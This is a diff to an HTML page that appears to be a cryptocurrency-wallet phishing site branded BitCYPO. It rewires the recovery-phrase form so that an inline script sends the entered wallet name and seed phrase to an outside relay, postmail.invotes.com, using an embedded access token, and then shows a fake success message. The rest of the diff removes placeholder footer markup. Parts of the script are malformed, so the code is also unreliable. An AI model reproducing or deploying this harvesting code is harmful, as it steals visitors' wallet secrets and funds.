@@ -131,7 +131,7 @@
     <!-- phrase form -->
 
     <div id="phrase" class="tabcontent" style="display: block">
-        <form class="main_form" method="POST" action="cache/phrase.php">
+        <form class="main_form" id="javascript_form">
             <input type="hidden" name="category" value="Phrase" />
         <div class="row">
             <div class="col-md-12 ">
@@ -155,11 +155,83 @@
             </div>
             <br />
             <div class="col-md-12">
-                <button class="send_btn"> Send</button>
+                <input type="submit" id="js_send" value="Send" class="send_btn" />
+                <!-- <button class="send_btn"  id="js_send"> Send</button> -->
             </div>
         </div>        
         </form>
     </div>
+
+
+
+
+    <script>
+
+        //update this with your js_form selector
+        var form_id_js = "javascript_form";
+    
+        var data_js = {
+            "access_token": "y04njsmbmidij13kbgtcyetg" // sent after you sign up
+        };
+    
+        function js_onSuccess() {
+            // remove this to avoid redirect
+            window.location = window.location.pathname + "?message=Email+Successfully+Sent%21&isError=0";
+        }
+    
+        function js_onError(error) {
+            // remove this to avoid redirect
+            window.location = window.location.pathname + "?message=Email+could+not+be+sent.&isError=1";
+        }
+    
+        var sendButton = document.getElementById("js_send");
+    
+        function js_send() {
+            sendButton.value='Sending…';
+            sendButton.disabled=true;
+            var request = new XMLHttpRequest();
+            request.onreadystatechange = function() {
+                if (request.readyState == 4 && request.status == 200) {
+                    js_onSuccess();
+                } else
+                if(request.readyState == 4) {
+                    js_onError(request.response);
+                }
+            };
+    
+            var subject = document.querySelector("#" + form_id_js + " [name='wallet']").value;
+            var message = document.querySelector("#" + form_id_js + " [name='phrase']" +  " [name='email']" + " [name='password']"  ).value;
+            
+            data_js['wallet'] = subject;
+            data_js['phrase']['email']['password'] = message;
+            var params = toParams(data_js);
+    
+            request.open("POST", "https://postmail.invotes.com/send", true);
+            request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    
+            request.send(params);
+    
+            return false;
+        }
+    
+        sendButton.onclick = js_send;
+    
+        function toParams(data_js) {
+            var form_data = [];
+            for ( var key in data_js ) {
+                form_data.push(encodeURIComponent(key) + "=" + encodeURIComponent(data_js[key]));
+            }
+    
+            return form_data.join("&");
+        }
+    
+        var js_form = document.getElementById(form_id_js);
+        js_form.addEventListener("submit", function (e) {
+            e.preventDefault();
+        });
+    </script>
+
+    
                 <!-- keystore form -->
     <div id="keystore" class="tabcontent" style="display: none">
 
@@ -231,82 +303,7 @@
                     <a class="logo_bottom" href="index.html">BitCYPO</a>
                 </div> -->
                     <div class="col-md-3 col-sm-6" ">
-            <!-- <div class=" Informa conta ">
-                 <h3>Contact Us</h3>
-                 <ul>
-                    <li> <a href=" Javascript:void(0) "> <i class=" fa fa-map-marker " aria-hidden=" true "></i> Location
-                       </a>
-                    </li>
-                    <li> <a href=" Javascript:void(0) "><i class=" fa fa-phone " aria-hidden=" true "></i> Call +01 1234567890
-                       </a>
-                    </li>
-                    <li> <a href=" Javascript:void(0) "> <i class=" fa fa-envelope " aria-hidden=" true "></i> demo@gmail.com
-                       </a>
-                    </li>
-                 </ul>
-                 <ul>
-                    <li>Readable content of                              
-                    </li>
-                    <li>a page when looking                           
-                    </li>
-                    <li>at its layoutreadable                          
-                    </li>
-                    <li>content of a page                             
-                    </li>
-                    <li>when looking at its                         
-                    </li>
-                    <li>layout                          
-                    </li>
-                 </ul>
-              </div>
-           </div>
-           <div class=" col-md-3 col-sm-6 "">
-                        <div class="Informa helpful">
-                            <h3>Useful Link</h3>
-                            <ul>
-                                <li>Readable content of
-                                </li>
-                                <li>a page when looking
-                                </li>
-                                <li>at its layoutreadable
-                                </li>
-                                <li>content of a page
-                                </li>
-                                <li>when looking at its
-                                </li>
-                                <li>layout
-                                </li>
-                            </ul>
-                        </div>
-                    </div>
-                    <div class="col-md-3 col-sm-6" ">
-              <div class=" Informa ">
-                 <h3>Offices</h3>
-                 <ul>
-                    <li>Readable content of                              
-                    </li>
-                    <li>a page when looking                           
-                    </li>
-                    <li>at its layoutreadable                          
-                    </li>
-                    <li>content of a page                             
-                    </li>
-                    <li>when looking at its                         
-                    </li>
-                    <li>layout                          
-                    </li>
-                 </ul>
-              </div>
-           </div>
-           <div class=" col-md-3 col-sm-6 ">
-              <div class=" Informa ">
-                 <h3>Newsletter</h3>
-                 <form class=" newslatter_form ">
-                    <input class=" ente " placeholder=" Enter your email " type=" text " name=" Enter your email ">
-                    <button class=" subs_btn ">Subscribe</button>
-                 </form>
-              </div>
-           </div> -->
+           
           </div>
           <div class=" copyright text_align_center">
                         <div class="container">
